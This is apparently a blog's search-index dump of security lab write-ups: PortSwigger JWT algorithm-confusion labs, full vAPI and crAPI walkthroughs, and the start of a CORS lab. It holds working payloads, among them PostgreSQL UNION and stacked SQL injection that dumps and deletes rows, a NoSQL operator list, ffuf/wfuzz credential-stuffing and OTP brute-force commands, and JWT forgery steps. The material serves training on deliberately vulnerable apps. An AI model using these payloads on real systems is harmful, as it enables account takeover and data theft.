we’ll create a new RSA key, so copy the key into New RSA Key in Burp&#39;s JWT Editor Keys:Save the RSA key and copy the public key in PEM and encode it using BASE64 (we can use decoder).We can now create New Symmetric Key and save the base64 encoded PEM public key into k !This is now original request if we’ve logged in and tried access /admin:We have to change alg to HS256 and sub to administrator and sign the token using Symmetric Key we’ve created moments before.Exchange the token and delete carlos in order to solve the lab.JWT authentication bypass via algorithm confusion with no exposed key This lab uses a JWT-based mechanism for handling sessions. It uses a robust RSA key pair to sign and verify tokens. However, due to implementation flaws, this mechanism is vulnerable to algorithm confusion attacks. To solve the lab, first obtain the server’s public key. Use this key to sign a modified session token that gives you access to the admin panel at /admin, then delete the user carlos. You can log in to your own account using the following credentials: wiener:peterMake sure you check this article first so the lab actually makes sense ==&amp;gt; https://portswigger.net/web-security/jwt/algorithm-confusionFor this lab we’ll need two valid tokens, so we’ll login 2 times to get 2 different tokens for single user.Both tokens will be piped into a tool sign2n. The reason why i’m not using docker container from portswigger/sig2n is because it does not work out of the box for me and basically does the same as https://github.com/silentsignal/rsa_sign2n/tree/release/standalone. Choose either one.First token worked and i was logged in as wiener.I’ve used cat on the x509.pem key and piped it into bash64.Now create a new Symmetric Key and exchange the k bash64 encoded value above.Change the alg and sub and sign the token using Symmetric Key that was generated above.Delete carlos to solve the lab." }, { "title": "Vulnerable Lab by Tushar Kulkarni (@roottusk) - vAPI (writeup)", "url": "/posts/vapi_writeup/", "categories": "Web Application, API", "tags": "Notes, Web Application, API", "date": "2022-12-21 08:00:00 +0100", "snippet": "IntroThis post is all about the vapi which is hosted on github and it has been created by Tushar Kulkarni.The PlanThis vulnerable API has no Frontend like e.g., craPI, so i’ll just take documentation and import it to my Postman Instance as a collection.I’ll be using Kali Linux and following tools: Burp Suite Community Postman ffuf wfuzz jwt_tokenTOC Intro TOC Vulnerabilities API1:2019 Broken Object Level Authorization&amp;lt; API2:2019 Broken User Authentication API3:2019 Excessive Data Exposure API4:2019 Lack of Resources \\&amp;amp; Rate Limiting API5:2019 Broken Function Level Authorization API6:2019 Mass Assignment API7:2019 Security Misconfiguration API8:2019 Injection API9:2019 Improper Assets Management API10:2019 Insufficient Logging \\&amp;amp; Monitoring ARENA - Server-Side Request Forgery VulnerabilitiesAfter having imported API documentation into Postman, we’ll notice that documentation is very conviniently arranged.Each API folder is for each API vulnerability type. We know what we have to do, so let’s begin…API1:2019 Broken Object Level Authorization&amp;lt; APIs tend to expose endpoints that handle object identifiers, creating a wide attack surface Level Access Control issue. Object level authorization checks should be considered in every function that accesses a data source using an input from the user. Source: https://github.com/OWASP/API-Security/blob/master/2019/en/src/0xa1-broken-object-level-authorization.mdIn order to even send a request in postman, we need to set variables. To get started we need host variable. I’ve added vapi.local to my /etc/hosts file, just to make the requests more distingishable.Now let’s go to API1 and use POST Create User to create a user:I’ve got an ID of 5. This should be added to api1_id environment variable, same as api1_auth. Otherwise check Console!If we issue GET Get User request, we should see our dataIf we change ID to 1, we can read other users information, leading to BOLA vulnerability{ &quot;id&quot;: 1, &quot;username&quot;: &quot;michaels&quot;, &quot;name&quot;: &quot;Michael Scott&quot;, &quot;course&quot;: &quot;flag{api1_d0cd9be2324cc237235b}&quot;}Same happens with PUT method if we set an ID to some other users, like 2.We have now overwritten user that was stored under ID of 2.API2:2019 Broken User Authentication Authentication mechanisms are often implemented incorrectly, allowing attackers to compromise authentication tokens or to exploit implementation flaws to assume other user’s identities temporarily or permanently. Compromising a system’s ability to identify the client/user, compromises API security overall. Source: https://github.com/OWASP/API-Security/blob/master/2019/en/src/0xa2-broken-user-authentication.mdIn this section, we have to check Resources folder to get list of credentials:This are credentials provided luka@yokai  ~/dckr/vapi/Resources/API2_CredentialStuffing   master  head -n 5 creds.csv brown.grimes@hotmail.com,w_5yhfENreuben.heaney@hotmail.com,8JhcB_mHdcronin@robel.com,V$qe{8+3hcollier@veum.com,vVsU7/yNvemard@gmail.com,gRfJ3$U7There are 2 endpoints present:I’ve set a proxy to Burp and sent a request to brute-force the credentials provided!I’ve splited the creds.csv into 2 separate files# Userscat creds.csv | awk -F&quot;,&quot; &#39;{print $1}&#39; &amp;gt; users# Passwordscat creds.csv | awk -F&quot;,&quot; &#39;{print $1}&#39; &amp;gt; passesIn Burp, we’ll use Pitchfork mode.Alternatively, we could process single file twice in Burp, usernames before the comma and passwords after the comma.We can brute-force credentials using FFUF as wellffuf -w users:USERS -w passes:PASS -u http://vapi.local/vapi/api2/user/login -d &#39;{&quot;email&quot;:&quot;USERS&quot;,&quot;password&quot;:&quot;PASS&quot;}&#39; -H &quot;Content-Type: application/json&quot; -mode pitchfork -mc all -fc 401FFUF ended up with 3 working credentials:[Status: 200, Size: 89, Words: 1, Lines: 1, Duration: 1769ms] * USERS: savanna48@ortiz.com * PASS: zTyBwV/9[Status: 200, Size: 89, Words: 1, Lines: 1, Duration: 1971ms] * USERS: hauck.aletha@yahoo.com * PASS: kU-wDE7r[Status: 200, Size: 89, Words: 1, Lines: 1, Duration: 1829ms] * USERS: harber.leif@beatty.info * PASS: kU-wDE7rAuthentication should work with one of the credentials and we should get a token back.We can also see that we have Rate Limiting problem here.Using /vapi/api2/user/details (GET) we’ll notice that we get information about every user out there.API3:2019 Excessive Data Exposure Looking forward to generic implementations, developers tend to expose all object properties without considering their individual sensitivity, relying on clients to perform the data filtering before displaying it to the user. Source: https://github.com/OWASP/API-Security/blob/master/2019/en/src/0xa3-excessive-data-exposure.mdAPI3 only has only one Endpoint in documentationWe can create a new user but that’s it.For API3 challenge we’ll need to check Resources that come with the app.We’ll get an .apk which we’ll have to reverse. I’ve used jadx-gui for that!See the endpoint there?What if we send a get request to that endpoint?Yes we get a flag and as we can notice, much more information that’s necessary.API4:2019 Lack of Resources &amp;amp; Rate Limiting Quite often, APIs do not impose any restrictions on the size or number of resources that can be requested by the client/user. Not only can this impact the API server performance, leading to Denial of Service (DoS), but also leaves the door open to authentication flaws such as brute force. Source: https://github.com/OWASP/API-Security/blob/master/2019/en/src/0xa4-lack-of-resources-and-rate-limiting.mdThe API4 has 3 documented EndpointsWe can use Mobile Login, however this is only 1 part of the login process. We need to provide OTP as well and here is where vulnerability lies. Verify OTP has no rate limiting set, making it easy for us to brute-force the OTP code. We can use Intrudr or WFUZZwfuzz -z range,0000-9999 -u http://vapi.local/vapi/api4/otp/verify -d &#39;{&quot;otp&quot;:&quot;FUZZ&quot;}&#39; -H &quot;Content-Type: application/json&quot; --hc 403If we provide the right OTP, key will be returned and environment variable set, so we can retrieve the flag in Get DetailsAPI5:2019 Broken Function Level Authorization Complex access control policies with different hierarchies, groups, and roles, and an unclear separation between administrative and regular functions, tend to lead to authorization flaws. By exploiting these issues, attackers gain access to other users’ resources and/or administrative functions. Source: https://github.com/OWASP/API-Security/blob/master/2019/en/src/0xa5-broken-function-level-authorization.mdWe have to documented endpoints here for API5. We can create user…… and we can retrieve its information.There is no BOLA, so we cannot ask information for other user by changing its ID.We can however try to send request to different path that is not documented and sounds like it could be right ==&amp;gt; /vapi/api5/users.… and indeed, the endpoint does not check users credentials (or does not check authorization for it)API6:2019 Mass Assignment Binding client provided data (e.g., JSON) to data models, without proper properties filtering based on an allowlist, usually leads to Mass Assignment. Either guessing objects properties, exploring other API endpoints, reading the documentation, or providing additional object properties in request payloads, allows attackers to modify object properties they are not supposed to. Source: https://github.com/OWASP/API-Security/blob/master/2019/en/src/0xa6-mass-assignment.mdWith Mass Assignment vulnerability we can change values ob some object even when we’re not supposed to.We can create user…… and retrieve its parameters.Can we assign credits to ourselves when we create a new user?Let’s create a new user and add credit parameter with some interger to it.Parameter credit does indeed reflect on ou users objectAPI7:2019 Security Misconfiguration Security misconfiguration is commonly a result of unsecure default configurations, incomplete or ad-hoc configurations, open cloud storage, misconfigured HTTP headers, unnecessary HTTP methods, permissive Cross-Origin resource sharing (CORS), and verbose error messages containing sensitive information. Source: https://github.com/OWASP/API-Security/blob/master/2019/en/src/0xa7-security-misconfiguration.mdFor Security Misconfiguration vulnerability (API7) we have 7 documented endpoints available:We’ve created user, now we should be able to log in (API7_auth token should be saved automatically)Perhaps irrelevant, we after login PHPSESSID session cookie will be set!We can now grab a keyVulnerability here lies in missing CORS protection or in other words - CORS is to permisive and as such allows grabing keys from victim any location.API8:2019 Injection Injection flaws, such as SQL, NoSQL, Command Injection, etc., occur when untrusted data is sent to an interpreter as part of a command or query. The attacker’s malicious data can trick the interpreter into executing unintended commands or accessing data without proper authorization. Source: https://github.com/OWASP/API-Security/blob/master/2019/en/src/0xa8-injection.mdI’ve sent a request to Burp and checked for SQL injection there.We can use the key to get the flag:API9:2019 Improper Assets Management APIs tend to expose more endpoints than traditional web applications, making proper and updated documentation highly important. Proper hosts and deployed API versions inventory also play an important role to mitigate issues such as deprecated API versions and exposed debug endpoints. Source: https://github.com/OWASP/API-Security/blob/master/2019/en/src/0xa9-improper-assets-management.mdWe have a single endpoint available here which is login with provided user and we’re supposed to guess/brute-force PIN.Now the problem is that we gate rate-limited after 5 attempts.There is v1 instance available which has no rate-limiting enabledExploitation after finding the endpoint is the same as in API4.API10:2019 Insufficient Logging &amp;amp; Monitoring Insufficient logging and monitoring, coupled with missing or ineffective integration with incident response, allows attackers to further attack systems, maintain persistence, pivot to more systems to tamper with, extract, or destroy data. Most breach studies demonstrate the time to detect a breach is over 200 days, typically detected by external parties rather than internal processes or monitoring. Source: https://github.com/OWASP/API-Security/blob/master/2019/en/src/0xaa-insufficient-logging-monitoring.mdHere we get a flag right away, but i guess we get and understand a message, right?{ &quot;message&quot;: &quot;Hey! I didn&#39;t log and monitor all the requests you&#39;ve been sending. That&#39;s on me...&quot;, &quot;flag&quot;: &quot;flag{api10_5db611f7c1ffd747971f}&quot;}ARENA - Server-Side Request Forgeryasd is vulnerable to Server-Side Request Forgery and vulnerability is not hard to find.Interestingly if we try to connect with http://localhost or http://127.0.0.1, we’ll get 403 response back.We can however let the server connect with external resources like https://webhook.site which will display that HTTP request.Inband SSRF returns response BASE64 encoded.We can e.g., use file:// to read files on the system." }, { "title": "Vulnerable Lab by OWASP - crAPI (Writeup)", "url": "/posts/crAPI_writeup/", "categories": "Web Application, API", "tags": "Notes, Web Application, API", "date": "2022-12-21 08:00:00 +0100", "snippet": "IntroThis post is all about the crAPI which is OWASP’s vulnerable web API application. It has few challenges across all TOP 10 API Vulnerabilities. In total 15 challenges/vulnerabilities and 2 secret ones. Overview - crAPI At a high level, the crAPI application is modeled as a B2C application that allows any user to get their car servicing done by a car mechanic. A user can create an account on the WebApp, manage his/her cars, search for car mechanics, submit servicing request for any car, and purchase car accessories from the vendor. The WebApp also has a community section where users can contribute with blog posts and comments. The crAPI application, by design, does not implement all of its functionalities in the most secure manner. In other words, it deliberately exposes security vulnerabilities that can be exploited by any security enthusiast who is playing with the application. For more details on the vulnerabilities see the challenges.md Source: https://github.com/OWASP/crAPI/blob/develop/docs/overview.mdThe PlanI’ll start with recon (for completion purposes) and then i’ll document each finding under each vulnerability type.I’ll be using Kali Linux and following tools: Burp Suite Community Postman ffuf wfuzz jwt_tokenTOC Intro TOC Recon Setting up Postman to Reverse Engineer an API Mitmproxy and Swagger creation Challenges 1. BOLA Challenge 1 - Access details of another user’s vehicle Challenge 2 - Access mechanic reports of other users 2. Broken User Authentication Challenge 3 - Reset the password of a different user 3. Excessive Data Exposure Challenge 4 - Find an API endpoint that leaks sensitive information of other users Challenge 5 - Find an API endpoint that leaks an internal property of a video 4. Rate Limiting Challenge 6 - Perform a layer 7 DoS using ‘contact mechanic’ feature 5. BFLA Challenge 7 - Delete a video of another user 6. Mass Assignment Challenge 8 - Get an item for free Challenge 9 - Increase your balance by $1,000 or more Challenge 10 - Update internal video properties 7. Injections (SSRF) - Challenge 11 - Make crAPI send an HTTP call to “www.google.com” and return the HTTP response. (NoSQLi) - Challenge 12 - Find a way to get free coupons without knowing the coupon code. (SQLi) - Challenge 13 - Find a way to redeem a coupon that you have already claimed by modifying the database Getting Databases Getting Tables (all) Getting columns from user_details Finding applied coupons columns Dumping applied coupon table Changing Values in the row UPDATE/DELETE (Unauthenticated Access) - Challenge 14 - Find an endpoint that does not perform authentication checks for a user. (Vulnerable JWT) - Challenge 15 - Find a way to forge valid JWT Tokens Algorithm Confusion Invalid Signature Vulnerability JKU Misuse Vulnerability KID Path Traversal Vulnerability ReconFirst of all, we should be able to get onto login page if our crAPI instance is working as intended:I’ve named the instance crapi.localLet’s have a Burp (or other proxy) running and let’s sign up and login.We can notice in the requests that there are some signs of API that’re being used:We can see that Sitemap has been populated with those paths as well.Obviously we cannot say for sure that this is the only endpoint out there.We can do wordlist directory enumeration with tools like gobuster, wfuzz or FFUF. I like FFUF the most so i’ll run FFUF against the target using swagger-wordlist.txt from assetnoteThe problem at this point is that i see different status codes and cannot sort them out immediately. It is important to get understanding how APP (or Web Application) work. In the next chapter i’ll run the app and reverse engineer the API.Setting up Postman to Reverse Engineer an APIThis are basic settings:I’ve also set an additional filter to my url crapi.local. I’ve also filtered out .css,.map,.js… Oh and don’t forget to setup browser to the right proxy afterwards. For emails that are being sent from the app itself, you should be able to read them on port 8025 where MailHog is runningWe can add requests to collection (if we’ve chosen our requests to History and not the collection itself)… This is what we have so far: We have to decide if this kind of documentation and reversing process is viable for us or not. Considering the size of the API for crAPI application, we can sort and document the endpoints by hand.There is not a single way how to document the API, but we can take existing documentation as a reference. We can take a look at Explore function in our Postman.Mitmproxy and Swagger creationLet’s run all requests again by browsing the app and pipe them through mitmproxyI’ve ran mitmweb using -w option which writes flows into a file and i’ve used another port then default 8090.mitmweb --listen-port 8090 -w crapi_flowWe should get a list of requests and should look like this:After we’re done we can save the flows (we can also set filter e.g., /api) and run mitmproxy2swagger:mitmproxy2swagger -i flows -o swagger.yaml --examples -f flow -p &quot;http://crapi.local:8888&quot;We can import swagger file to an editor or into postman directly. There is also online instance running at https://editor.swagger.io where we can upload YAML and edit it. If we would just want the list of endpoints, we could just use mitmproxy2swagger -i flows -o swagger_no_examples.yaml -f flow -p &quot;http://crapi.local:8888&quot; without --examples tag. luka@yokai  ~/crapi_vapi  cat swagger_no_examples.yaml openapi: 3.0.0info: title: flows Mitmproxy2Swagger version: 1.0.0servers:- url: http://crapi.local:8888 description: The default serverpaths: {}x-path-templates:# Remove the ignore: prefix to generate an endpoint with its URL# Lines that are closer to the top take precedence, the matching is greedy- ignore:/community/api/v2/community/posts- ignore:/community/api/v2/community/posts/recent- ignore:/community/api/v2/community/posts/v6HRovghs98ZdmzcBdaY7B- ignore:/community/api/v2/community/posts/v6HRovghs98ZdmzcBdaY7B/comment- ignore:/community/api/v2/coupon/validate-coupon- ignore:/identity/api/auth/login- ignore:/identity/api/auth/signup- ignore:/identity/api/v2/user/change-email- ignore:/identity/api/v2/user/dashboard- ignore:/identity/api/v2/user/pictures- ignore:/identity/api/v2/user/reset-password- ignore:/identity/api/v2/user/verify-email-token- ignore:/identity/api/v2/user/videos- ignore:/identity/api/v2/user/videos/{id}- ignore:/identity/api/v2/user/videos/29- ignore:/identity/api/v2/user/videos/convert_video- ignore:/identity/api/v2/vehicle/add_vehicle- ignore:/identity/api/v2/vehicle/c6acc7f0-14d2-4642-a2ea-2b63967834ff/location- ignore:/identity/api/v2/vehicle/resend_email- ignore:/identity/api/v2/vehicle/vehicles- ignore:/workshop/api/mechanic- ignore:/workshop/api/mechanic/- ignore:/workshop/api/merchant/contact_mechanic- ignore:/workshop/api/shop/orders- ignore:/workshop/api/shop/orders/{id}- ignore:/workshop/api/shop/orders/2- ignore:/workshop/api/shop/orders/all- ignore:/workshop/api/shop/orders/return_order- ignore:/workshop/api/shop/products- ignore:/workshop/api/shop/return_qr_codeI really like to have a list like this in front of me. What do we see almost immediately? E.g., /workshop does not use /v2/. This is also a good base to create a wordlist using endpoints above.If we upload our swagger.json to the Postman, we’ll see that it’s very well ordered:Challenges1. BOLA If this was rewal engagement, it would be wise or necesarry to add an additional user which we could attack.Challenge 1 - Access details of another user’s vehicleWe have to pay attention to where we can read other users data. Most obvious would be any kind of IDs.One such request is /identity/api/v2/vehicle/c6acc7f0-14d2-4642-a2ea-2b63967834ff/location.Although we cannot simply brute-force the UUID, we can find it elsewhereAnd we can find cars location if we have knowledge of other cars UUID: Vulnerable Endpoint: /identity/api/v2/vehicle/9882ead6-1c5f-48eb-a0e7-408ffa0dbbf8/locationChallenge 2 - Access mechanic reports of other usersThis BOLA vulnerability has been hidden on plain sight, as we first need to send a request for report where link will get generated Request sent: /workshop/api/mechanic/receive_report?mechanic_code=TRAC_JHN&amp;amp;problem_details=repair&amp;amp;vin=9XPLG11UTSQ720977This is a new endpoint which was unknown until now: /workshop/api/mechanic/mechanic_report` Vulnerable Endpoint: /workshop/api/mechanic/mechanic_report?report_id=82. Broken User AuthenticationChallenge 3 - Reset the password of a different userWe can reset password for any user (this is not a vulnerability!)Interestingly, there are 2 versions: /identity/api/auth/v2/check-otp (found / guessed) /identity/api/auth/v3/check-otp (default)Long story short, v2 is missing rate-limiting, so we can simply brute-force the OTP.wfuzz -z range,0000-9999 -u http://crapi.local:8888/identity/api/auth/v2/check-otp -d &#39;{&quot;email&quot;: &quot;victim@cybersec-research.space&quot;,&quot;otp&quot;:&quot;FUZZ&quot;,&quot;password&quot;:&quot;SSSaaasss!!!&quot;}&#39; -H &quot;Content-Type: application/json&quot; --hw 5 -v Vulnerable Endpoint: /identity/api/auth/v2/check-otp3. Excessive Data ExposureChallenge 4 - Find an API endpoint that leaks sensitive information of other usersVulnerable Endpoint: /community/api/v2/community/posts/recent /community/api/v2/community/posts/:{id} /community/api/v2/community/posts/:{id}/commentAt least information that’s marked in the screenshot, did not have to be exposed in the response.Challenge 5 - Find an API endpoint that leaks an internal property of a videoVulnerable Endpoint: /identity/api/v2/user/videos /identity/api/v2/user/videos/:{id}4. Rate LimitingChallenge 6 - Perform a layer 7 DoS using ‘contact mechanic’ feature5. BFLAHere we’re searching for basically the same as BOLA, just with a crucial difference - we’re not reading but changing stuff, so we might have to send other HTTP Verbs like PUT, DELETE, POST.Challenge 7 - Delete a video of another userThere were no endpoints found using DELETE HTTP Verb, but i haven’t yet been actively searching for them to.When trying things around, following endpoint replies with errorVideo with 32 ID belongs to another user. Error message says we should use admin API, and if we do that, we can delete the video. Vulnerable Endpoint: /identity/api/v2/admin/videos/:id6. Mass AssignmentFor Mass Assignment i wanted to try some automation using arjun, but actually more than that, i wanted to quickly have a list of host+endpoints which i could use for different tools. I’ve exported the collection from Postman and used gron+grep+sed+awk+sort to get a list. luka@yokai  ~/crapi_vapi  gron crapi_flow\\ Mitmproxy2Swagger.postman_collection.json | fgrep &quot;originalRequest.url.raw&quot; | awk -F&quot;=&quot; &#39;{print $2}&#39; | sed &#39;s//http:\\/\\/crapi.local:8888/&#39; | cut -d&#39;&quot;&#39; -f2| sed &#39;s//v1/&#39; | sort -uhttp://crapi.local:8888/community/api/v1/community/postshttp://crapi.local:8888/community/api/v1/community/posts/recenthttp://crapi.local:8888/community/api/v1/community/posts/v6HRovghs98ZdmzcBdaY7Bhttp://crapi.local:8888/community/api/v1/community/posts/v6HRovghs98ZdmzcBdaY7B/commenthttp://crapi.local:8888/community/api/v1/coupon/validate-couponhttp://crapi.local:8888/identity/api/auth/loginhttp://crapi.local:8888/identity/api/auth/signuphttp://crapi.local:8888/identity/api/v1/user/change-emailhttp://crapi.local:8888/identity/api/v1/user/dashboardhttp://crapi.local:8888/identity/api/v1/user/pictureshttp://crapi.local:8888/identity/api/v1/user/reset-passwordhttp://crapi.local:8888/identity/api/v1/user/verify-email-tokenhttp://crapi.local:8888/identity/api/v1/user/videoshttp://crapi.local:8888/identity/api/v1/user/videos/:idhttp://crapi.local:8888/identity/api/v1/user/videos/:id?video_idhttp://crapi.local:8888/identity/api/v1/vehicle/add_vehiclehttp://crapi.local:8888/identity/api/v1/vehicle/c6acc7f0-14d2-4642-a2ea-2b63967834ff/locationhttp://crapi.local:8888/identity/api/v1/vehicle/resend_emailhttp://crapi.local:8888/identity/api/v1/vehicle/vehicleshttp://crapi.local:8888/workshop/api/mechanic/http://crapi.local:8888/workshop/api/merchant/contact_mechanichttp://crapi.local:8888/workshop/api/shop/ordershttp://crapi.local:8888/workshop/api/shop/orders/:idhttp://crapi.local:8888/workshop/api/shop/orders/:id?order_idhttp://crapi.local:8888/workshop/api/shop/productsI would now just fix the IDs and create a list for v2 and v3.cat hosts_crapi.txt | sed &#39;s/v1/v2/&#39; | anew hosts_crapi.txtcat hosts_crapi.txt | sed &#39;s/v1/v3/&#39; | anew hosts_crapi.txtChallenge 8 - Get an item for freeWe can set status to returned by using PUT method.Funds will be returned.Vulnerable Endpoint: /workshop/api/shop/orders/:id (PUT)Challenge 9 - Increase your balance by $1,000 or moreWe can use negative numbers to increase our balance.We can also create new product with negative numbers that will increase funds on our balance.Vulnerable Endpoint: /workshop/api/shop/orders (POST) /workshop/api/shop/products (POST)Challenge 10 - Update internal video propertiesIn the following Mass Assignment vulnerability it is possible to change parameter which isn’t included in the default request.Vulnerable Endpoint: /identity/api/v2/user/videos/:id (PUT)7. Injections(SSRF) - Challenge 11 - Make crAPI send an HTTP call to “www.google.com” and return the HTTP response.SSRF happens where we can enter another URL which will be visited from the server side.… and i can see corresponding request on webhook.site.We can also see authorization header leak, as well as all parameters.Vulnerable Endpoint: /workshop/api/merchant/contact_mechanic (POST - mechanic_api)25(NoSQLi) - Challenge 12 - Find a way to get free coupons without knowing the coupon code.After running NOSQLi Payloads through collection runner which was set like this:Only potential vulnerable requests were chosen. Injection that caught my attention was &quot;coupon&quot;:{&quot;gt&quot;:&quot;&quot;}.I’ve sent the request to Burp and this is the wordlist that i’ve used.&quot;coupon_code[$ne]&quot;:1&quot;coupon_code[$regex]&quot;:&quot;^adm&quot;&quot;coupon_code[$regex]&quot;:&quot;.{25}&quot;&quot;coupon_code[$eq]&quot;:&quot;admin&quot;&quot;coupon_code[$ne]&quot;:&quot;admin&quot;&quot;coupon_code[$nin][admin]&quot;:&quot;admin&quot;&quot;coupon_code[$regex]&quot;:&quot;.*&quot;&quot;coupon_code[$exists]&quot;:true&quot;coupon_code&quot;: {&quot;$ne&quot;: null} &quot;coupon_code&quot;: {&quot;$ne&quot;: &quot;foo&quot;} &quot;coupon_code&quot;: {&quot;$gt&quot;: undefined}&quot;coupon_code&quot;: {&quot;$gt&quot;:&quot;&quot;}We can see that we get coupon in response:We can even get a better one:Vulnerable Endpoint: /community/api/v2/coupon/validate-coupon (POST - “coupon_code”)(SQLi) - Challenge 13 - Find a way to redeem a coupon that you have already claimed by modifying the databaseWe’ve found some coupons in previous challenge.We’ve redeemed those and now we cannot redeem same token anymore? Not a problem. Endpoint is vulnerable to SQL Injection.From here, i’ll just post body from each requestGetting Databases{&quot;coupon_code&quot;:&quot;blind&#39; UNION ALL select string_agg(datname,&#39;,&#39;) FROM pg_database OFFSET 0--&quot;,&quot;amount&quot;:125}{&quot;message&quot;:&quot;postgres,crapi,template1,template0 Coupon code is already claimed by you!! Please try with another coupon code&quot;}Getting Tables (all){&quot;coupon_code&quot;:&quot;blind&#39; UNION ALL SELECT string_agg(table_name,&#39;,&#39;) FROM information_schema.tables --&quot;,&quot;amount&quot;:125}{&quot;message&quot;:&quot;otp_token,profile_video,user_details,vehicle_model,vehicle_details,vehicle_location,vehicle_company,pg_statistic,pg_type,user_login,otp,django_migrations,pg_foreign_table,pg_authid,pg_shadow,pg_statistic_ext_data,pg_roles,mechanic,service_request,pg_settings,pg_file_settings,pg_hba_file_rules,product,order,applied_coupon,pg_config,pg_shmem_allocations,pg_backend_memory_contexts,pg_available_extension_versions,health_check_db_testmodel,pg_user_mapping,pg_stat_xact_user_functions,pg_replication_origin_status,pg_subscription,pg_attribute,pg_proc,pg_class,pg_attrdef,pg_constraint,pg_inherits,pg_index,pg_operator,pg_opfamily,pg_opclass,pg_am,pg_amop,pg_amproc,pg_language,pg_stat_archiver,pg_stat_bgwriter,pg_stat_wal,pg_stat_progress_analyze,pg_stat_progress_vacuum,pg_stat_progress_cluster,pg_stat_progress_create_index,pg_stat_progress_basebackup,pg_stat_progress_copy,pg_largeobject_metadata,...SNIP...applicable_roles,administrable_role_authorizations,check_constraint_routine_usage,character_sets,check_constraints,collations,collation_character_set_applicability,column_column_usage,column_domain_usage,routines,column_privileges,role_column_grants,column_udt_usage,columns,constraint_column_usage,routine_column_usage,...SNIP...,views,triggers,udt_privileges,foreign_data_wrappers,role_udt_grants,data_type_privileges,usage_privileges,role_usage_grants,user_defined_types,element_types,view_column_usage,view_routine_usage,_pg_foreign_servers,_pg_foreign_table_columns,column_options,_pg_foreign_data_wrappers,foreign_table_options,foreign_data_wrapper_options,foreign_server_options,foreign_servers,_pg_foreign_tables,user_mapping_options,foreign_tables,_pg_user_mappings Coupon code is already claimed by you!! Please try with another coupon code&quot;}Getting columns from user_details{&quot;coupon_code&quot;:&quot;blind&#39; UNION ALL SELECT string_agg(column_name,&#39;,&#39;) FROM information_schema.columns WHERE table_name=&#39;user_details&#39; --&quot;,&quot;amount&quot;:125}{&quot;message&quot;:&quot;id,available_credit,picture,user_id,name,status Coupon code is already claimed by you!! Please try with another coupon code&quot;}Finding applied coupons columns{&quot;coupon_code&quot;:&quot;blind&#39; UNION ALL SELECT string_agg(column_name,&#39;,&#39;) FROM information_schema.columns WHERE table_name=&#39;applied_coupon&#39; --&quot;,&quot;amount&quot;:125}{&quot;message&quot;:&quot;id,user_id,coupon_code Coupon code is already claimed by you!! Please try with another coupon code&quot;}Dumping applied coupon table{&quot;coupon_code&quot;:&quot;blind&#39; UNION ALL SELECT string_agg(concat(id||&#39;,&#39;||user_id||&#39;,&#39;||coupon_code),&#39;;&#39;) FROM applied_coupon --&quot;,&quot;amount&quot;:125}Changing Values in the row UPDATE/DELETENow either modfy (UPDATE) the row or delete it.UPDATE applied_coupon SET coupon_code=&#39;&#39; WHERE user_id=8DELETE the row with our user_id=8{&quot;coupon_code&quot;:&quot;blind&#39;;DELETE FROM applied_coupon WHERE user_id=8 --&quot;,&quot;amount&quot;:125}We’ll get Server Error but PSQL Query has been executed and we can apply our coupon again.Output from SQLMAP:(Unauthenticated Access) - Challenge 14 - Find an endpoint that does not perform authentication checks for a user.Running Collection in Postman without token has returned no 401/403 errors on following Endpoint: http://crapi.local:8888/workshop/api/mechanic/mechanic_report?report_id=1 luka@yokai  ~/crapi_vapi  curl http://crapi.local:8888/workshop/api/mechanic/mechanic_report\\?report_id\\=15 -s | jq{ &quot;id&quot;: 15, &quot;mechanic&quot;: { &quot;id&quot;: 1, &quot;mechanic_code&quot;: &quot;TRAC_JHN&quot;, &quot;user&quot;: { &quot;email&quot;: &quot;jhon@example.com&quot;, &quot;number&quot;: &quot;&quot; } }, &quot;vehicle&quot;: { &quot;id&quot;: 28, &quot;vin&quot;: &quot;9XPLG11UTSQ720977&quot;, &quot;owner&quot;: { &quot;email&quot;: &quot;luka@cybersec-research.space&quot;, &quot;number&quot;: &quot;123123123&quot; } }, &quot;problem_details&quot;: &quot;repair&quot;, &quot;status&quot;: &quot;Pending&quot;, &quot;created_on&quot;: &quot;21 January, 2023, 07:36:27&quot;}(Vulnerable JWT) - Challenge 15 - Find a way to forge valid JWT TokensI highly suggest checking out Portswigger’s Web AcademyAlgorithm ConfusionPublic Key has been found on .well-known/jwks.json. This will be used in Algorithm Confusion attack.I will be using Burp’s JWT Editor extension which is also available for Community Edition.Now let’s copy the key JWT Editor and create new RSA key.Save the key and copy it’s public key in PEM format and BASE64 encode it.Now create New Symmetric Key and copy the BASE64 encoded PEM public key into k value.We should now be able to sign JWT tokens. (Sign as HS256! not RS256)Change alg to HS256 and when signing Don&#39;t modify header.We can basically take over any account.Invalid Signature VulnerabilityWhat we’ve done above is great but reality is that Signature isn’t really being verified, meaning we can take over any account and don’t even need to re-sign the JWT token. This can be tested simply by changing values like sub and JWT token will work.JKU Misuse VulnerabilityThe server supports the jku parameter in the JWT header. However, it fails to check whether the provided URL belongs to a trusted domain before fetching the key.For this attack, we’ll create a New RSA Token in JWT Editor and save it.We’ll copy public key in PEM format… and paste the key on our web server in following format:{ &quot;keys:[ KEY COMES HERE ]}Start the webserver (if not already running).Using JWT Editor we can modify jku, kid and (if we want to) the sub values.When we sign and send a request, we should see traffic on our web server.Response should be successful.KID Path Traversal VulnerabilityIn order to verify the signature, the server uses the kid parameter in JWT header to fetch the relevant key from its filesystem.For this attack we’ll need Symmetric Key ready from JWT Editor.Exchange the k value with AA== (this is not necesarry for an attack, but it’s just workaround for Burp)We will have to add/change the values accordingly where kid is going to point to traversed ../../../../../../../../dev/null and we’ll use our Symmetric Key to sign the JWT token." }, { "title": "(Portswigger/WebAcademy) - Cross-Origin Resource Sharing (CORS)", "url": "/posts/CORS/", "categories": "Web Application, Cross-Origin Resource Sharing", "tags": "Notes, Web Application, Portswigger", "date": "2022-12-21 08:00:00 +0100", "snippet": "IntroThis post/writeup is all about the Cross-Origin Resource Sharing or simply CORS.I’ll be using primarily Portswigger Web Academy Labs, but i do intent do throw other labs and writeups here as well.To learn more on the topic, please visit the article linked above at Portswigger’s. CORS is a controlled relaxation of the same-origin policy (SOP) and does not protect against CSRF!TOC Intro TOC CORS vulnerability with basic origin reflection CORS vulnerability with trusted null origin CORS vulnerability with trusted insecure protocols CORS vulnerability with internal network pivot attackCORS vulnerability with basic origin reflection This website has an insecure CORS configuration in that it trusts all origins. To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator’s API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator’s API key. You can log in to your own account using the following credentials: wiener:peterWhen we login using wiener:peter credentials, we’ll get apikey returned which we’re supposed to steal.Mind the response headerHTTP/1.1 200 OKAccess-Control-Allow-Credentials: true...This means that credentials can be sent over different domains. If we add 